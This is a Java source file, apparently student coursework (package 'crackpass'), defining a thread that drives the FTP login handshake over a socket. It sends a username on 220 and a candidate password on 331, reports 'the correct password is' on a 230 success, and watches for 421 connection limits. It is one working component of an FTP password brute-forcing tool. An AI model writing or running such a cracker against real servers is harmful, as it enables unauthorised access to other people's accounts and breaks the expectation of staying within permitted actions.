package crackpass;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.LinkedList;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author dam2
 */
public class HebraEscritora extends Thread {

    LinkedList<String> mensajes;
    Socket socket;
    String usuario;
    String pass;
    boolean conexLim;

    public HebraEscritora() {
    }

    public HebraEscritora(LinkedList<String> mensajes, Socket socket, String usuario, String pass) {
        this.mensajes = mensajes;
        this.socket = socket;
        this.usuario = usuario;
        this.pass = pass;
        this.conexLim = false;
    }

    @Override
    public void run() {
        String respuesta = "";
        PrintWriter escribir = null;

        try {
            escribir = new PrintWriter(socket.getOutputStream(), true);

            while (!socket.isClosed()) {

                while (!mensajes.isEmpty()) {
                    respuesta = mensajes.pop();
                }
                sleep(10);
                if (respuesta.contains("421")) {
                    conexLim = true;
                    try {
                        socket.close();
                    } catch (IOException ex) {
                        Logger.getLogger(HebraEscritora.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
                sleep(10);
                if (respuesta.contains("230")) {
                    System.out.println("Has entrado: El usuario " + usuario
                            + " con la contraseña correcta es: " + pass);
                    sleep(10);
                    try {
                        
                        socket.close();
                    } catch (IOException ex) {
                        Logger.getLogger(HebraEscritora.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }

                sleep(10);

                //System.out.println("antes del 530 " + respuesta);
                if (respuesta.contains("530 Login")) {
                    try {

                        socket.close();
                    } catch (IOException ex) {
                        Logger.getLogger(HebraEscritora.class.getName()).log(Level.SEVERE, null, ex);
                    }
                }
                sleep(10);
                if (respuesta.contains("220")) {
                    escribir.println("user " + usuario);

                }
                sleep(10);
                if (respuesta.contains("331")) {
                    escribir.println("pass " + pass);
                }

            }
        } catch (Exception ex) {
            Logger.getLogger(HebraEscritora.class.getName()).log(Level.SEVERE, null, ex);

        }
        
    }

    public LinkedList<String> getMensajes() {
        return mensajes;
    }

    public Socket getSocket() {
        return socket;
    }

    public String getUsuario() {
        return usuario;
    }

    public String getPass() {
        return pass;
    }

    public boolean isConexLim() {
        return conexLim;
    }

}
